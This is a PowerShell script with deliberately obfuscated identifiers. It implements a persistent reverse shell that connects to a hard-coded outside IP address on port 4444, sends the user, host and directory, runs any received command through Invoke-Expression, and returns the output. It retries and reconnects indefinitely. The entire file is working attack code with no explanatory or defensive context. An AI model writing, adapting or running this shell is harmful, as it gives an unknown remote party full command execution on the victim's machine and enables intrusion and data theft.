class aBkPRzAXCwgz {
    
    [string]$EJsnS = "93.49.240.195"
    [int]$sbiXZBsyOULKWz = 4444

    $sFkrmZ
    $isbDLv
    $qlZvhRKsCifwNApTFFzMqpF
    $sJcRswTHRPLmPhC
    $qAIWxfNSv
    $CmydcmDkdvTxIyvpHs
    [int]$mPvIcWhRQFPYd = 50*1024

    JKvtyFbRAEfjyDgvDTeM() {
        $this.isbDLv = $false
        while ($true) {
            try {
                $this.isbDLv = New-Object Net.Sockets.TcpClient($this.EJsnS, $this.sbiXZBsyOULKWz)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.QRcCXWDvVW()
    }

    QRcCXWDvVW() {
        $this.sFkrmZ = $this.isbDLv.GetStream()
        $this.sJcRswTHRPLmPhC = New-Object Byte[] $this.mPvIcWhRQFPYd
        $this.CmydcmDkdvTxIyvpHs = New-Object Text.UTF8Encoding
        $this.qlZvhRKsCifwNApTFFzMqpF = New-Object IO.StreamWriter($this.sFkrmZ, [Text.Encoding]::UTF8, $this.mPvIcWhRQFPYd)
        $this.qAIWxfNSv = New-Object System.IO.StreamReader($this.sFkrmZ)
        $this.qlZvhRKsCifwNApTFFzMqpF.AutoFlush = $true
    }

    XqoxVQcWvVG() {
        $this.JKvtyFbRAEfjyDgvDTeM()
        $this.VmlWHZGXJy()
    }

    YemVuDIg($vwvWjaGhzpBlGChWIjeQ) {
        try {
            [byte[]]$RtRNaukVNgkXtFQIvNBiot = [text.Encoding]::Ascii.GetBytes($vwvWjaGhzpBlGChWIjeQ)
            $this.qlZvhRKsCifwNApTFFzMqpF.Write($RtRNaukVNgkXtFQIvNBiot, 0, $RtRNaukVNgkXtFQIvNBiot.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.XqoxVQcWvVG()
        }
    }

    [string] jjOuZVmNDJEczfxLQvq() {
        try {
            $ArHXKHzhcqdCvQe = $this.sFkrmZ.Read($this.sJcRswTHRPLmPhC, 0, $this.mPvIcWhRQFPYd)    
            $FUfAWMxhMXmLg = ($this.CmydcmDkdvTxIyvpHs.GetString($this.sJcRswTHRPLmPhC, 0, $ArHXKHzhcqdCvQe))
            return $FUfAWMxhMXmLg
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.XqoxVQcWvVG()
            return ""
        }
    }

    [string] ljGKTOjg($iburWnMlnamGhK) {
        Write-Host $iburWnMlnamGhK
        try { 
            $ihjCEYvg = Invoke-Expression $iburWnMlnamGhK | Out-String
        }
        catch {
            $UMsjPWrFOFomMbEkV = $_.Exception
            $eCIrKeIfkTdG = $_.Message
            $ihjCEYvg = "`n$_`n"
        }
        return $ihjCEYvg
    }

    [string] hHaQTwrhAPjKUBrKlSlSYk() {
        $rDcpGawDVYWcCDvHAASDehCO = [Environment]::UserName
        $OKNGlLpIAbtkq = [System.Net.Dns]::GetHostName()
        $yPqJZU = Get-Location
        return "$rDcpGawDVYWcCDvHAASDehCO@$OKNGlLpIAbtkq [$yPqJZU]~$ "
    }

    VmlWHZGXJy() {
        while ($this.isbDLv.Connected) {
            $this.YemVuDIg($this.hHaQTwrhAPjKUBrKlSlSYk())         
            $FUfAWMxhMXmLg = $this.jjOuZVmNDJEczfxLQvq()
            $ihjCEYvg = "`n"
            if ([string]::IsNullOrEmpty($FUfAWMxhMXmLg)) {
                continue
            }
            $ihjCEYvg = $this.ljGKTOjg($FUfAWMxhMXmLg)
            $this.YemVuDIg($ihjCEYvg + "`n")
            $this.sFkrmZ.Flush()
        }
        $this.isbDLv.Close()
        $this.XqoxVQcWvVG()
    } 
}

$KgbaGXZZOKMhdhhjwtoJdf = [aBkPRzAXCwgz]::new()
$KgbaGXZZOKMhdhhjwtoJdf.XqoxVQcWvVG()
